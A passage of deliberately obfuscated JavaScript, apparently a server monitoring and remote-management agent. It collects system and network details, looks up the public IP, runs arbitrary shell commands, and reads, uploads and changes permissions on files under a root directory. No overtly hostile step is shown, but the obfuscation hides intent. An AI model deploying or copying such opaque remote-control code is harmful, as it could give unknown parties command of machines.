                        const v = Buffer[bv(0x6ef)](d['body'], bv(0x1fc))[bv(0x6b0)](c[bv(0x202)]);
                        d['body'] = JSON[bv(0x65d)](v);
                    } else {
                        if (d[bv(0x4ca)][bv(0x42d)]()[bv(0x214)]('{') || d[bv(0x4ca)][bv(0x42d)]()[bv(0x214)]('['))
                            d['body'] = JSON[bv(0x65d)](d['body']);
                        else {
                            if (c['aNvMa'](d[bv(0x4ca)][bv(0x42d)](), ''))
                                d[bv(0x4ca)] = {};
                        }
                    }
                }
            } catch (w) {
                return a0C['error'](bv(0x650) + w[bv(0x257)]), f['status'](0x190)[bv(0x707)]({ 'error': bv(0x312) + w[bv(0x257)] });
            }
        }
        const m = f['send'];
        f[bv(0x166)] = function (x) {
            const by = bv;
            if (f[by(0x4b8)]('Content-Type') && f[by(0x4b8)](h[by(0x3a7)])['includes'](h['iPEeB']))
                try {
                    const y = typeof x === by(0x5f4) ? JSON[by(0x65d)](x) : x;
                    if (d[by(0x4ac)]) {
                        let z = null;
                        h['aUfCc'](d['key_source'], h[by(0x6d7)]) && b && (z = b[by(0x194)]());
                        const A = a[by(0x5ba)](y, z), B = typeof A === h[by(0x6c4)] ? A : JSON[by(0x542)](A);
                        return f[by(0x2c3)](h[by(0x4c6)], h[by(0x4ec)]), f[by(0x2c3)](h['YNEfA'], a0O[by(0x4c5)]), f['set'](h['frCKm'], Buffer[by(0x2a2)](B, h['dIZki'])[by(0x6b0)]()), m['call'](this, B);
                    } else {
                        const C = h[by(0x285)](typeof x, 'string') ? x : JSON['stringify'](y);
                        return f['set'](h['vGsFu'], by(0x359)), f['set'](h['frCKm'], Buffer[by(0x2a2)](C, by(0x5e6))[by(0x6b0)]()), m['call'](this, C);
                    }
                } catch (D) {
                    if (a0O[by(0x2ed)])
                        a0C['error'](by(0x47e) + D[by(0x257)]);
                }
            return m['call'](this, x);
        }, c[bv(0x4e8)](g);
    };
}
class a0T {
    constructor() {
        const bz = a0aQ, a = {
                'nSeYN': function (b, c) {
                    return b / c;
                }
            };
        this['lastNetworkStats'] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[bz(0x5df)] = 0x0, this[bz(0x6f6)] = 0x0, this[bz(0x526)] = a[bz(0x25d)](Date[bz(0x27f)](), 0x3e8);
    }
    async [a0aQ(0x72e)]() {
        const bA = a0aQ, a = {
                'dedQw': bA(0x5e6),
                'bLVzO': function (d, f) {
                    return d === f;
                },
                'Fyfqk': function (d, f, g) {
                    return d(f, g);
                },
                'dQtOt': function (d, f, g) {
                    return d(f, g);
                },
                'wraln': bA(0x418),
                'GzuFa': function (d, f, g) {
                    return d(f, g);
                },
                'MEwhT': bA(0x59d),
                'SfUHd': function (d, f) {
                    return d > f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[bA(0x2c8)](bA(0x42e), a[bA(0x26d)]))[bA(0x42d)]();
            b = a[bA(0x24c)](d, bA(0x3af)) ? null : a['Fyfqk'](parseInt, d, 0xa), c = a['dQtOt'](parseInt, (await a0m[bA(0x2c8)](bA(0x3c8), a['dedQw']))[bA(0x42d)](), 0xa);
        } catch {
            try {
                b = a[bA(0x599)](parseInt, (await a0m[bA(0x2c8)](a['wraln'], a['dedQw']))[bA(0x42d)](), 0xa), c = a[bA(0x3cd)](parseInt, (await a0m[bA(0x2c8)](a['MEwhT'], a['dedQw']))['trim'](), 0xa);
                if (a[bA(0x4a8)](b, 0x7ffffffffffff000))
                    b = null;
            } catch {
                const f = await a0t[bA(0x281)]();
                b = f[bA(0x13c)], c = f[bA(0x4fb)];
            }
        }
        if (a[bA(0x24c)](b, null)) {
            const g = await a0t[bA(0x281)]();
            b = g['total'], (a[bA(0x24c)](c, null) || isNaN(c)) && (c = g[bA(0x4fb)]);
        }
        return {
            'total': b,
            'used': c,
            'available': b - c,
            'free': b - c,
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async ['getBasicInfo']() {
        const bB = a0aQ, [a, b, c, d] = await Promise[bB(0x690)]([
                a0t[bB(0x248)](),
                this[bB(0x72e)](),
                a0t['osInfo'](),
                a0t['networkInterfaces']()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise['all']([
                this[bB(0x33f)](),
                this['getPublicIpV6']()
            ]);
        } catch (h) {
            a0C[bB(0x66e)]('获取\x20IP\x20地址失败:\x20' + h[bB(0x257)], 0x1);
        }
        return {
            'arch': a0o[bB(0x173)](),
            'cpu_cores': a['cores'],
            'cpu_name': a[bB(0x2fa)],
            'disk_total': (await a0t[bB(0x123)]())[0x0]?.['size'] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[bB(0x13c)],
            'os': c[bB(0x113)] + '\x20' + c[bB(0x217)],
            'kernel_version': c['kernel'],
            'swap_total': b[bB(0x565)],
            'version': a0O[bB(0x4c5)],
            'virtualization': await this['_getVirtualization'](),
            'session_key': a0O[bB(0x547)],
            'noise_key': a0O[bB(0x45d)]
        };
    }
    [a0aQ(0x70d)]() {
        const bC = a0aQ, a = {
                'elJkf': function (c, d) {
                    return c === d;
                },
                'fkqOi': function (c, d) {
                    return c === d;
                }
            }, b = a0o[bC(0x66f)]();
        for (const c of Object[bC(0x4f9)](b)) {
            for (const d of b[c]) {
                const f = a[bC(0x33c)](d['family'], bC(0x738)) || a[bC(0x778)](d[bC(0x21b)], 0x4);
                if (f && !d[bC(0x57f)]) {
                    if (!/^10\./[bC(0x590)](d[bC(0x37c)]) && !/^192\.168\./['test'](d[bC(0x37c)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./['test'](d[bC(0x37c)]))
                        return d['address'];
                }
            }
        }
        return null;
    }
    async ['getPublicIpV4']() {
        const bD = a0aQ, a = {
                'AFGPP': 'https://api.ipify.org',
                'UyhDW': 'https://checkip.amazonaws.com',
                'MGoEz': bD(0x4e2),
                'olKHQ': 'https://ipecho.net/plain',
                'XMhSv': bD(0x5f9)
            }, b = [
                a['AFGPP'],
                bD(0x4a7),
                a[bD(0x6ac)],
                a[bD(0x2bc)],
                a['olKHQ'],
                bD(0x683),
                a[bD(0x15e)]
            ];
        for (const d of b) {
            try {
                const f = await this[bD(0x655)](d, 0x4);
                if (f && this[bD(0x19f)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this['getLocalIPv4']();
        if (c && this[bD(0x19f)](c))
            return c;
        return null;
    }
    [a0aQ(0x6cd)]() {
        const bE = a0aQ, a = {
                'oNVoF': function (c, d) {
                    return c === d;
                },
                'ftgJK': bE(0x3a2),
                'PocCw': bE(0x139)
            }, b = a0o[bE(0x66f)]();
        for (const c of Object[bE(0x4f9)](b)) {
            for (const d of b[c]) {
                const f = a['oNVoF'](d[bE(0x21b)], a[bE(0x1cb)]) || d['family'] === 0x6;
                if (f && !d[bE(0x57f)]) {
                    if (!d[bE(0x37c)][bE(0x44e)]()[bE(0x214)](a[bE(0x11d)]))
                        return d[bE(0x37c)];
                }
            }
        }
        return null;
    }
    async ['getPublicIpV6']() {
        const bF = a0aQ, a = {
                'DjPGn': bF(0x509),
                'wATLG': 'https://icanhazip.com'
            }, b = this['getLocalIPv6']();
        if (b && this[bF(0x62b)](b))
            return b;
        const c = [
            a[bF(0x682)],
            a[bF(0x495)],
            bF(0x667)
        ];
        for (const d of c) {
            try {
                const f = await this[bF(0x655)](d, 0x6);
                if (f && this[bF(0x62b)](f))
                    return f;
            } catch (g) {
                a0C[bF(0x66e)](bF(0x342) + d + bF(0x5b0) + g[bF(0x257)]);
                continue;
            }
        }
        return null;
    }
    async [a0aQ(0x655)](a, b = 0x0) {
        const bG = a0aQ, c = {
                'fdEAz': function (d, f) {
                    return d !== f;
                },
                'OVvvs': function (d, f) {
                    return d(f);
                },
                'DCKDC': function (d, f) {
                    return d(f);
                },
                'UCxsn': bG(0x24e),
                'pzEis': bG(0x594),
                'PAdbN': 'error'
            };
        return new Promise((d, f) => {
            const bH = bG, g = {
                    'XUYSS': function (k, l) {
                        return c['fdEAz'](k, l);
                    },
                    'KKVme': function (k, l) {
                        return k(l);
                    },
                    'ualIW': bH(0x3a4),
                    'gyPLp': function (k, l) {
                        const bI = bH;
                        return c[bI(0x21c)](k, l);
                    },
                    'NRWOJ': bH(0x20c)
                }, h = c[bH(0x43a)](require, c[bH(0x35d)]), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c['pzEis'] }
                }, j = h[bH(0x4b8)](a, i, k => {
                    const bJ = bH;
                    let l = '';
                    if (g['XUYSS'](k[bJ(0x713)], 0xc8)) {
                        g[bJ(0x2ff)](f, new Error(bJ(0x45c) + k[bJ(0x713)]));
                        return;
                    }
                    k['on'](g['ualIW'], m => l += m), k['on'](bJ(0x2b5), () => d(l[bJ(0x42d)]()));
                });
            j['on'](c[bH(0x4f5)], f), j[bH(0x6a0)](0x1388, () => {
                const bK = bH;
                j[bK(0x371)](), g[bK(0x3df)](f, new Error(g[bK(0x530)]));
            });
        });
    }
    [a0aQ(0x19f)](a) {
        return /^(\d{1,3}\.){3}\d{1,3}$/['test'](a);
    }
    [a0aQ(0x62b)](a) {
        const bL = a0aQ;
        if (!/^[0-9a-fA-F:]+$/[bL(0x590)](a) || !a[bL(0x374)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i[bL(0x590)](a))
            return ![];
        return !![];
    }
    async [a0aQ(0x476)]() {
        const bM = a0aQ, a = {
                'NuTWt': function (m, n) {
                    return m / n;
                },
                'XKbyD': function (m, n) {
                    return m - n;
                },
                'LoaqZ': function (m, n) {
                    return m / n;
                },
                'WRQgJ': function (m, n) {
                    return m * n;
                },
                'ItHyy': function (m, n) {
                    return m * n;
                }
            }, [b, c, d, f] = await Promise[bM(0x690)]([
                a0t[bM(0x513)](),
                a0t[bM(0x281)](),
                a0t[bM(0x581)](),
                a0t['currentLoad']()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[bM(0x668)](Date[bM(0x27f)](), 0x3e8), i = a[bM(0x36c)](h, this['lastNetworkTime']), j = g[bM(0x2d4)] - this[bM(0x3d7)]['tx'], k = g[bM(0x306)] - this[bM(0x3d7)]['rx'];
        this[bM(0x5df)] += j, this[bM(0x6f6)] += k, this[bM(0x3d7)] = {
            'tx': g['tx_bytes'],
            'rx': g[bM(0x306)]
        }, this[bM(0x526)] = h;
        const l = await a0t['processes']();
        return {
            'cpu': { 'usage': Math['round'](b[bM(0x513)]) },
            'ram': {
                'total': c[bM(0x13c)],
                'used': c['active']
            },
            'swap': {
                'total': c['swaptotal'],
                'used': c[bM(0x43b)]
            },
            'load': {
                'load1': a[bM(0x1f2)](Math[bM(0x741)](a[bM(0x15f)](f[bM(0x4a2)], 0x64)), 0x64),
                'load5': Math[bM(0x741)](a[bM(0x4de)](f[bM(0x4a2)], 0x64)) / 0x64,
                'load15': a[bM(0x668)](Math[bM(0x741)](a[bM(0x4de)](f['avgLoad'], 0x64)), 0x64)
            },
            'disk': await this[bM(0x5cb)](),
            'network': {
                'up': Math['round'](a[bM(0x1f2)](j, i)),
                'down': Math[bM(0x741)](a[bM(0x1f2)](k, i)),
                'totalUp': this[bM(0x5df)],
                'totalDown': this[bM(0x6f6)]
            },
            'connections': await this['_getConnections'](),
            'uptime': a0o[bM(0x16e)](),
            'process': l?.[bM(0x690)] || 0x0,
            'message': ''
        };
    }
    async [a0aQ(0x736)]() {
        const bN = a0aQ, a = {
                'qoPYK': bN(0x597),
                'lYqTg': bN(0x27b),
                'PznwO': '/run/.containerenv',
                'XfSpb': bN(0x21a),
                'kDBuj': bN(0x5e6),
                'GbxqV': 'containerd',
                'XFFtD': bN(0x37d),
                'ztOuA': bN(0x644),
                'yWZhI': '/proc/self/mountinfo',
                'IzIWz': bN(0x44d),
                'bNslb': bN(0x1c9),
                'rKVyE': bN(0x325),
                'BhANq': bN(0x53c),
                'NXGtL': bN(0x1a5),
                'vpWBj': bN(0x700),
                'OKiYo': 'QEMU',
                'NXNEh': 'None'
            };
        try {
            if (a0l[bN(0x617)](a['qoPYK']))
                return a[bN(0x643)];
            if (a0l[bN(0x617)](a[bN(0x2a7)]))
                return a['XfSpb'];
            if (a0l['existsSync'](bN(0x289))) {
                const b = a0l[bN(0x5db)](bN(0x289), a[bN(0x47a)])[bN(0x44e)]();
                if (b[bN(0x374)](bN(0x160)) || b[bN(0x374)](a['GbxqV']))
                    return 'Docker';
                else {
                    if (b['includes']('kubepods'))
                        return a[bN(0x639)];
                    else {
                        if (b['includes'](a[bN(0x49f)]))
                            return bN(0x1a5);
                    }
                }
            }
            if (a0l[bN(0x617)](bN(0x138))) {
                const c = a0l[bN(0x5db)](a['yWZhI'], a[bN(0x47a)]);
                if (c[bN(0x374)](a['IzIWz']) || c['includes'](bN(0x1d6)))
                    return bN(0x27b);
                else {
                    if (c[bN(0x374)](a['bNslb']) || c[bN(0x374)](a[bN(0x1a6)]))
                        return a[bN(0x639)];
                }
            }
            if (a0l[bN(0x617)](bN(0x2a8))) {
                const d = a0l[bN(0x5db)](bN(0x2a8), a[bN(0x47a)]);
                if (d['includes'](a[bN(0x3b3)]))
                    return a['NXGtL'];
            }
            if (a0l[bN(0x617)](a[bN(0x2d8)])) {
                const f = a0l[bN(0x5db)]('/proc/cpuinfo', bN(0x5e6));
                if (f[bN(0x374)](bN(0x5cc)) || f[bN(0x374)]('KVM'))
                    return a[bN(0x57b)];
            }
        } catch (g) {
        }
        return a[bN(0x60a)];
    }
    async [a0aQ(0x5cb)]() {
        const bO = a0aQ, a = {
                'CTpzL': function (b, c) {
                    return b > c;
                },
                'WgLRQ': function (b, c) {
                    return b !== c;
                },
                'shdoc': 'tmpfs',
                'mbNrb': bO(0x2ee),
                'Ykhrz': bO(0x4df)
            };
        try {
            const b = await a0t[bO(0x123)](), c = b['filter'](g => {
                    const bP = bO;
                    return a[bP(0x6a1)](g[bP(0x316)], 0x0) && a[bP(0x731)](g[bP(0x4b3)], a[bP(0x2fc)]) && a[bP(0x731)](g['type'], a['mbNrb']) && g['fs'][bP(0x214)](a['Ykhrz']);
                }), d = c['reduce']((g, h) => g + h[bO(0x316)], 0x0), f = c['reduce']((g, h) => g + h[bO(0x4fb)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0aQ(0x3a6)]() {
        const bQ = a0aQ;
        try {
            const a = await a0t[bQ(0x26c)](), b = a[bQ(0x6ab)](d => d[bQ(0x410)] === bQ(0x2bd))[bQ(0x54b)], c = a[bQ(0x6ab)](d => d[bQ(0x410)] === 'udp')[bQ(0x54b)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0U {
    static async [a0aQ(0x59e)](a, b = {}) {
        const bR = a0aQ, c = {
                'NzijD': function (d, f) {
                    return d || f;
                },
                'aXuzG': function (d, f) {
                    return d === f;
                },
                'UJHif': function (d, f) {
                    return d(f);
                },
                'tuUjG': function (d, f) {
                    return d * f;
                },
                'yBFfO': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[bR(0x14c)](),
                env: env = {},
                timeout: timeout = a0O[bR(0x5d1)]
            } = b;
        return new Promise(d => {
            const bT = bR, f = {
                    'hkrFX': function (i, j) {
                        return i - j;
                    },
                    'ufrZa': function (i, j) {
                        const bS = a0b;
                        return c[bS(0x351)](i, j);
                    },
                    'XKYRb': function (i, j) {
                        return c['aXuzG'](i, j);
                    },
                    'KfTWO': function (i, j) {
                        return c['UJHif'](i, j);
                    }
                }, g = Date[bT(0x27f)](), h = a0q(a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c['tuUjG'](timeout, 0x3e8),
                    'maxBuffer': c[bT(0x117)](0xa, 0x400) * 0x400
                }, (i, j, k) => {
                    const bU = bT, l = f[bU(0x1da)](Date['now'](), g), m = i && i[bU(0x282)] && i[bU(0x226)];
                    let n = f[bU(0x3fd)](j, '');
                    if (k)
                        n += k;
                    let o = 0x0;
                    if (i) {
                        if (m)
                            o = 0x7c;
                        else
                            f[bU(0x1fe)](typeof i[bU(0x2f3)], bU(0x4c9)) ? o = i[bU(0x2f3)] : o = -0x1;
                    }
                    f[bU(0x756)](d, {
                        'result': n,
                        'exitcode': o,
                        'timeout': m,
                        'cmd': a
                    });
                });
        });
    }
}
function a0V(a) {
    const bV = a0aQ, b = {
            'qSYfs': function (c, d) {
                return c === d;
            }
        };
    try {
        const c = a0l[bV(0x353)][bV(0x388)](a0n[bV(0x249)](a0O['FILE_ROOT'])), d = a0n['resolve'](a);
        let f = d;
        while (!a0l[bV(0x617)](f)) {
            const j = a0n[bV(0x40b)](f);
            if (b[bV(0x486)](j, f))
                return ![];
            f = j;
        }
        const g = a0l['realpathSync'][bV(0x388)](f), h = a0n[bV(0x376)](c, g);
        if (h[bV(0x214)]('..') || a0n[bV(0x240)](h))
            return ![];
        const i = a0n['relative'](f, d);
        if (i && (i[bV(0x214)]('..') || a0n[bV(0x240)](i)))
            return ![];
        return !![];
    } catch (k) {
        return ![];
    }
}
class a0W {
    static async [a0aQ(0x4e7)](a, b = ![]) {
        const bW = a0aQ, c = {
                'JcLll': bW(0x1f6),
                'SNScd': bW(0x448),
                'arufo': function (h, i) {
                    return h & i;
                },
                'lXYFh': function (h, i) {
                    return h(i);
                },
                'FQrQn': bW(0x5e2)
            }, d = a0n[bW(0x249)](a0O['FILE_ROOT'], a || '.');
        if (!c[bW(0x3a1)](a0V, d))
            throw new Error(bW(0x74b));
        if (!a0l[bW(0x617)](d))
            throw new Error(c[bW(0x369)]);
        const f = [], g = h => {
                const bX = bW, i = a0l['readdirSync'](h);
                for (const j of i) {
                    const k = a0n['join'](h, j), l = a0l[bX(0x2f4)](k), m = new a0K();
                    m[bX(0x1c3)] = j, m[bX(0x5ae)] = a0n[bX(0x376)](a0O[bX(0x725)], k), m[bX(0x4b3)] = l[bX(0x467)]() ? c[bX(0x560)] : c['SNScd'], m['size'] = l['size'], m[bX(0x10f)] = l[bX(0x10f)][bX(0x1ab)](), m[bX(0x722)] = this[bX(0x1fd)](l[bX(0x722)], l[bX(0x467)]()), m[bX(0x747)] = '0o' + c[bX(0x5f6)](l[bX(0x722)], 0x1ff)['toString'](0x8), m[bX(0x74e)] = l[bX(0x6b2)] + ':' + l[bX(0x482)], f['push'](m), b && l[bX(0x467)]() && c[bX(0x3a1)](g, k);
                }
            };
        return g(d), f;
    }
    static async [a0aQ(0x329)](a) {
        const bY = a0aQ, b = {
                'KsyiP': function (d, f) {
                    return d(f);
                },
                'JkxWU': function (d, f) {
                    return d & f;
                },
                'TEmBK': bY(0x1f6),
                'joGeY': bY(0x448)
            }, c = [];
        for (const d of a) {
            const f = a0n[bY(0x249)](a0O[bY(0x725)], d);
            if (!b[bY(0x548)](a0V, f))
                continue;
            try {
                const g = a0l[bY(0x2f4)](f), h = this[bY(0x33b)](f, a0l[bY(0x5b5)]['R_OK']), i = this[bY(0x33b)](f, a0l['constants'][bY(0x5f3)]), j = this[bY(0x33b)](f, a0l['constants'][bY(0x69d)]), k = new a0L();
                k['path'] = a0n[bY(0x376)](a0O[bY(0x725)], f), k[bY(0x1c3)] = a0n[bY(0x3c7)](f), k[bY(0x722)] = this[bY(0x1fd)](g[bY(0x722)], g[bY(0x467)]()), k[bY(0x747)] = '0o' + b[bY(0x1bd)](g[bY(0x722)], 0x1ff)['toString'](0x8), k[bY(0x4b3)] = g['isDirectory']() ? b[bY(0x54e)] : b[bY(0x603)], k[bY(0x4f0)] = h, k[bY(0x6a7)] = i, k[bY(0x719)] = j, c[bY(0x385)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0aQ(0x33b)](a, b) {
        const bZ = a0aQ;
        try {
            return a0l[bZ(0x35c)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static [a0aQ(0x268)](a) {
        const c0 = a0aQ, b = {
                'VaKmI': function (c, d) {
                    return c === d;
                },
                'odfpx': 'number',
                'yYVYX': c0(0x5f4),
                'xVRiA': function (c, d, f) {
                    return c(d, f);
                },
                'LPKfS': c0(0x6ad)
            };
        if (b[c0(0x22b)](typeof a, b[c0(0x154)]))
            return a;
        if (b[c0(0x22b)](typeof a, b['yYVYX'])) {
            const c = a[c0(0x42d)]();
            if (/^[0-7]{3,4}$/[c0(0x590)](c))
                return b['xVRiA'](parseInt, c, 0x8);
        }
        throw new Error(b[c0(0x2d2)]);
    }
    static [a0aQ(0x1fd)](a, b) {
        const c1 = a0aQ, c = {
                'aFrKv': function (i, j) {
                    return i & j;
                },
                'fUEnb': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = c[c1(0x192)](a, 0x1ff)[c1(0x6b0)](0x8)['padStart'](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[c1(0x199)](parseInt, i, 0xa);
            h += f[c1(0x18d)]((k, l) => j & 0x4 >> l ? k : '-')[c1(0x6e2)]('');
        }
        return h;
    }
    static async ['setFilePermissions'](a, b = ![]) {
        const c2 = a0aQ, c = {
                'BYtkF': function (g, h) {
                    return g(h);
                },
                'qUOOw': function (g, h) {
                    return g(h);
                },
                'JeqYA': c2(0x5d2),
                'VJooU': function (g, h) {
                    return g(h);
                },
                'CLSGR': c2(0x3bf)
            }, d = [];
        for (const [g, h] of Object[c2(0x73f)](a)) {
            const i = a0n[c2(0x249)](a0O[c2(0x725)], g);
            if (!c[c2(0x4e6)](a0V, i)) {
                d[c2(0x385)]({
                    'path': g,
                    'requested': c[c2(0x6cc)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[c2(0x76d)]
                });
                continue;
            }
            try {
                const j = this[c2(0x268)](h), k = m => {
                        const c3 = c2;
                        a0l[c3(0x28f)](m, j);
                    };
                if (b && a0l[c2(0x617)](i) && a0l[c2(0x2f4)](i)['isDirectory']()) {
                    const m = n => {
                        const c4 = c2;
                        c[c4(0x4e6)](k, n);
                        const o = a0l[c4(0x5ef)](n);
                        for (const p of o) {
                            const q = a0n[c4(0x6e2)](n, p);
                            a0l[c4(0x2f4)](q)[c4(0x467)]() ? c[c4(0x4e6)](m, q) : k(q);
                        }
                    };
                    c[c2(0x4e6)](m, i);
                } else
                    k(i);
                const l = j[c2(0x6b0)](0x8);
                d[c2(0x385)]({
                    'path': g,
                    'requested': c[c2(0x3d8)](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[c2(0x385)]({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[c2(0x120)],
                    'message': n[c2(0x257)]
                });
            }
        }
        const f = d[c2(0x6ab)](o => o['status'] === 'ok')[c2(0x54b)];
        return {
            'status': 'ok',
            'total': d[c2(0x54b)],
            'success': f,
            'results': d
        };
    }
    static async ['readFile'](a) {
        const c5 = a0aQ, b = {
                'BCtQV': function (h, i) {
                    return h(i);
                },
                'aHLmI': c5(0x74b),
                'BZinA': c5(0x1bb),
                'QfbIa': c5(0x5e6),
                'VDiBK': 'base64',
                'rlsUB': 'utf-8'
            }, c = a0n[c5(0x249)](a0O[c5(0x725)], a);
        if (!b[c5(0x56e)](a0V, c))
            throw new Error(b[c5(0x433)]);
        const d = a0l[c5(0x2f4)](c);
        if (d[c5(0x316)] > 0x400 * 0x400)
            throw new Error(b[c5(0x6f5)]);
        const f = a0l['readFileSync'](c), g = this[c5(0x24f)](f);
        return {
            'status': 'ok',
            'path': a0n['relative'](a0O['FILE_ROOT'], c),
            'content': g ? a0v[c5(0x56d)](f) : f[c5(0x6b0)](b[c5(0x177)]),
            'encoding': g ? b[c5(0x40f)] : b['rlsUB'],
            'is_binary': g,
            'size': d[c5(0x316)]
        };
    }
    static [a0aQ(0x24f)](a) {
        const c6 = a0aQ, b = {
                'QhzHd': function (c, d) {
                    return c < d;
                },
                'NxEqe': function (c, d) {
                    return c === d;
                }
            };
        if (!a || a[c6(0x54b)] === 0x0)
            return ![];
        for (let c = 0x0; b[c6(0x53b)](c, Math[c6(0x441)](a[c6(0x54b)], 0x200)); c++) {
            if (b[c6(0x41a)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async ['uploadFile'](a, b, c, d = null, f = null) {
        const c7 = a0aQ, g = {
                'bSrGI': function (l, m) {
                    return l(m);
                },
                'LOcAn': c7(0x74b),
                'VojWC': function (l, m) {
                    return l > m;
                },
                'UpkbG': 'File\x20too\x20large',
                'JIepD': function (l, m) {
                    return l !== m;
                },
                'TqKbJ': function (l, m) {
                    return l !== m;
                },
                'BDhlX': function (l, m) {
                    return l(m);
                },
                'ERerI': c7(0x193),
                'omzag': c7(0x24d),
                'sJvqa': function (l, m) {
                    return l === m;
                }
            }, h = a0n[c7(0x249)](a0O[c7(0x725)], a);
        let j = h;
        b && (j = a0n['join'](h, b));
        if (!g[c7(0x55d)](a0V, j))
            throw new Error(g[c7(0x577)]);
        !a0l[c7(0x617)](a0n[c7(0x40b)](j)) && a0l[c7(0x389)](a0n[c7(0x40b)](j), { 'recursive': !![] });
        const k = a0v['toByteArray'](c);
        if (g[c7(0x6c2)](k[c7(0x54b)], a0O[c7(0x384)]))
            throw new Error(g[c7(0x170)]);
        if (g[c7(0x4fa)](d, null) && g[c7(0x6ce)](f, null)) {
            const l = Number(d), m = g[c7(0x630)](Number, f);
            if (Number['isNaN'](l) || Number['isNaN'](m))
                throw new Error(g[c7(0x34b)]);
            const n = a0n['join'](a0n['dirname'](j), g[c7(0x119)], a0n[c7(0x3c7)](j));
            !a0l[c7(0x617)](n) && a0l['mkdirSync'](n, { 'recursive': !![] });
            const o = a0n[c7(0x6e2)](n, c7(0x684) + l);
            a0l[c7(0x266)](o, k);
            const p = a0l[c7(0x5ef)](n)[c7(0x6ab)](s => s[c7(0x214)](c7(0x684))), q = p[c7(0x54b)], r = g['sJvqa'](q, m);
            if (r) {
                const s = a0l[c7(0x5e5)](j);
                for (let u = 0x0; u < m; u++) {
                    const v = a0n[c7(0x6e2)](n, 'chunk_' + u);
                    if (!a0l[c7(0x617)](v)) {
                        s[c7(0x52d)]();
                        throw new Error('Missing\x20chunk\x20' + u);
                    }
                    s[c7(0x336)](a0l[c7(0x5db)](v));
                }
                s[c7(0x2b5)]();
                const t = a0n[c7(0x40b)](n);
                a0l[c7(0x6f4)](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[c7(0x4e5)](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0n[c7(0x376)](a0O['FILE_ROOT'], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l['writeFileSync'](j, k), {
            'status': 'ok',
            'path': a0n['relative'](a0O['FILE_ROOT'], j),
            'received': k[c7(0x54b)],
            'total': k[c7(0x54b)],
            'chunked': ![]
        };
    }
    static async ['uploadFileRaw'](a, b, c, d = null, f = null) {
        const c8 = a0aQ, g = {
                'CQYJN': function (k, l) {
                    return k || l;
                },
                'rTNmu': function (k, l) {
                    return k(l);
                },
                'ChSzl': c8(0x74b),
                'UEnqf': c8(0x1bb),
                'qvuGk': function (k, l) {
                    return k !== l;
                },
                'wtEgF': function (k, l) {
                    return k(l);
                },
                'NSEcM': function (k, l) {
                    return k(l);
                },
                'nmeyM': c8(0x193),
                'DEpyw': '.upload_chunks',
                'bADTw': function (k, l) {
                    return k === l;
                },
                'iKdlB': function (k, l) {
                    return k < l;
                },
                'CDxPA': 'All\x20chunks\x20received.\x20File\x20merged\x20successfully.',
                'JKmcD': c8(0x531)
            }, h = a0n[c8(0x249)](a0O[c8(0x725)], g[c8(0x524)](a, '.'));
        let j = h;
        b && (j = a0n[c8(0x6e2)](h, b));
        if (!g[c8(0x6b6)](a0V, j))
            throw new Error(g[c8(0x186)]);
        !a0l['existsSync'](a0n[c8(0x40b)](j)) && a0l[c8(0x389)](a0n[c8(0x40b)](j), { 'recursive': !![] });
        if (c['length'] > a0O[c8(0x384)])
            throw new Error(g['UEnqf']);
        if (d !== null && g[c8(0x434)](f, null)) {
            const k = g[c8(0x77e)](Number, d), l = g[c8(0x558)](Number, f);
            if (Number[c8(0x3a0)](k) || Number[c8(0x3a0)](l))
                throw new Error(g[c8(0x1a4)]);
            const m = a0n['join'](a0n[c8(0x40b)](j), g[c8(0x252)], a0n[c8(0x3c7)](j));
            !a0l[c8(0x617)](m) && a0l['mkdirSync'](m, { 'recursive': !![] });
            const n = a0n[c8(0x6e2)](m, c8(0x684) + k);
            a0l[c8(0x266)](n, c);
            const o = a0l[c8(0x5ef)](m)[c8(0x6ab)](r => r['startsWith']('chunk_')), p = o[c8(0x54b)], q = g[c8(0x31d)](p, l);
            if (q) {
                const r = [];
                for (let t = 0x0; g['iKdlB'](t, l); t++) {
                    const u = a0n[c8(0x6e2)](m, c8(0x684) + t);
                    if (!a0l[c8(0x617)](u))
                        throw new Error(c8(0x216) + t);
                    r[c8(0x385)](a0l[c8(0x5db)](u));
                }
                a0l['writeFileSync'](j, Buffer[c8(0x562)](r));
                const s = a0n[c8(0x40b)](m);
                a0l[c8(0x6f4)](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[c8(0x4e5)](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0n['relative'](a0O[c8(0x725)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g['CDxPA']
                };
            }
            return {
                'status': 'ok',
                'path': a0n['relative'](a0O[c8(0x725)], j),
                'chunk_id': k,
                'completed': ![],
                'message': c8(0x543) + k + c8(0x782)
            };
        }
        return a0l[c8(0x266)](j, c), {
            'status': 'ok',
